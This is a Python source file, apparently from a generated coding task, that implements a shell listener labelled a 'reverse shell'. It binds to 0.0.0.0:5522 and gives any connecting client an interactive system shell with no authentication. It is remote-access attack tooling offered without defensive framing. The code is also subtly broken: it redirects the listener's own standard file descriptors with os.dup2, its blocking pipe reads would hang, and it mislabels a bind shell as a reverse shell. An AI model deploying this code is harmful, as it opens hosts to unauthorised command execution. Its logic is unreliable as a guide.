"""Unix reverse shell listener that spawns subprocesses via socket communication."""
from TASK_001_models import ExecutionResult, ReverseShellConfig
import os
import select
import signal
import socket
import subprocess
from typing import Optional



class UnixReverseShell:
    """A Unix reverse shell listener that accepts connections and executes commands.

    This class implements a TCP server listening on 0.0.0.0:5522 that spawns
    subprocesses using subprocess.Popen with stdin/stdout/stderr piped through
    the socket connection. Uses select.select() for non-blocking I/O multiplexing.
    """

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self._server_socket: Optional[socket.socket] = None
        self._client_sockets: list[socket.socket] = []
        self._processes: dict[socket.socket, subprocess.Popen] = {}

    def start(self) -> None:
        """Start the reverse shell listener server."""
        try:
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(
                socket.SOL_SOCKET, socket.SO_REUSEADDR, 1
            )
            self._server_socket.bind((self.config.host, self.config.port))
            self._server_socket.listen(5)
            self._server_socket.setblocking(False)
        except OSError as e:
            raise RuntimeError(f"Failed to bind server socket: {e}")

    def stop(self) -> None:
        """Stop the reverse shell listener and clean up resources."""
        for sock in self._client_sockets:
            try:
                sock.close()
            except (OSError, BrokenPipeError):
                pass
        self._server_socket.close()
        for proc in self._processes.values():
            proc.terminate()

    def _spawn_shell(self, client_sock: socket.socket) -> subprocess.Popen:
        """Spawn a shell process with stdin/stdout/stderr redirected to the socket.

        Args:
            client_sock: The connected client socket.

        Returns:
            A Popen object for the spawned shell process.
        """
        try:
            proc = subprocess.Popen(
                [self.config.shell_type],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
            )
            # Redirect stdin/stdout/stderr to the socket file descriptors
            os.dup2(client_sock.fileno(), 0)
            os.dup2(client_sock.fileno(), 1)
            os.dup2(client_sock.fileno(), 2)
            return proc
        except OSError as e:
            raise RuntimeError(f"Failed to spawn shell process: {e}")

    def _handle_client(self, client_sock: socket.socket) -> ExecutionResult:
        """Handle a connected client by spawning a shell and multiplexing I/O.

        Args:
            client_sock: The connected client socket.

        Returns:
            An ExecutionResult containing the output of executed commands.
        """
        try:
            proc = self._spawn_shell(client_sock)
            self._processes[client_sock] = proc

            # Set up signal handlers for graceful shutdown
            def _cleanup(signum, frame):
                client_sock.close()
                proc.terminate()
                raise KeyboardInterrupt

            signal.signal(signal.SIGINT, _cleanup)
            signal.signal(signal.SIGTERM, _cleanup)

            result: ExecutionResult = ExecutionResult(
                stdout="", stderr="", exit_code=0, error_message=""
            )

            try:
                while True:
                    # Use select.select for non-blocking I/O multiplexing
                    readable, _, _ = select.select(
                        [client_sock], [], [], self.config.timeout
                    )

                    if not readable:
                        break

                    data = client_sock.recv(4096)
                    if not data:
                        break

                    # Write received command to the process stdin
                    proc.stdin.write(data.decode("utf-8", errors="replace"))
                    proc.stdin.flush()

                    # Read output from the process stdout/stderr
                    try:
                        out = proc.stdout.read(4096)
                        if out:
                            client_sock.send(out.encode("utf-8"))
                    except (BrokenPipeError, OSError):
                        break

                    try:
                        err = proc.stderr.read(4096)
                        if err:
                            client_sock.send(err.encode("utf-8"))
                    except (BrokenPipeError, OSError):
                        break

            finally:
                # Collect final output for the result
                stdout_parts = []
                stderr_parts = []

                try:
                    while True:
                        out_chunk = proc.stdout.read(4096)
                        if not out_chunk:
                            break
                        stdout_parts.append(out_chunk)

                        err_chunk = proc.stderr.read(4096)
                        if not err_chunk:
                            break
                        stderr_parts.append(err_chunk)
                except (BrokenPipeError, OSError):
                    pass

                result.stdout = "".join(stdout_parts).strip()
                result.stderr = "".join(stderr_parts).strip()
                result.exit_code = proc.returncode or 0
                result.error_message = ""

            return result

        except subprocess.TimeoutExpired:
            proc.terminate()
            raise RuntimeError("Shell process timed out") from None
        except (BrokenPipeError, OSError) as e:
            proc.terminate()
            raise RuntimeError(f"Connection broken during execution: {e}") from None
        finally:
            try:
                client_sock.close()
            except (OSError, BrokenPipeError):
                pass

    def run(self) -> ExecutionResult | None:
        """Run the server accept loop and handle incoming connections.

        Returns:
            An ExecutionResult for the last handled connection, or None if no
            connection was processed before shutdown.
        """
        result: Optional[ExecutionResult] = None

        try:
            while True:
                # Accept new connections on the server socket
                readable, _, _ = select.select(
                    [self._server_socket], [], [], self.config.timeout
                )

                if not readable:
                    continue

                client_sock, addr = self._server_socket.accept()
                client_sock.setblocking(False)
                self._client_sockets.append(client_sock)

                # Handle the new connection in a separate thread-like manner
                try:
                    execution_result = self._handle_client(client_sock)
                    result = execution_result
                except Exception as e:
                    raise RuntimeError(f"Error handling client {addr}: {e}") from None

        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

        return result


class UnixReverseShellListener(UnixReverseShell):
    """Alias for UnixReverseShell for clarity in the execution hook context.

    This class serves as the listener that accepts incoming connections on
    0.0.0.0:5522 and spawns subprocesses to execute remote commands via
    socket communication with non-blocking I/O multiplexing.
    """

    def __init__(self, config: ReverseShellConfig):
        super().__init__(config)


if __name__ == "__main__":
    config = ReverseShellConfig(host="0.0.0.0", port=5522, timeout=30.0)
    listener = UnixReverseShellListener(config)
    result = listener.run()
    if result:
        print(f"Exit code: {result.exit_code}")
        print(f"Stdout:\n{result.stdout}")
        print(f"Stderr:\n{result.stderr}")
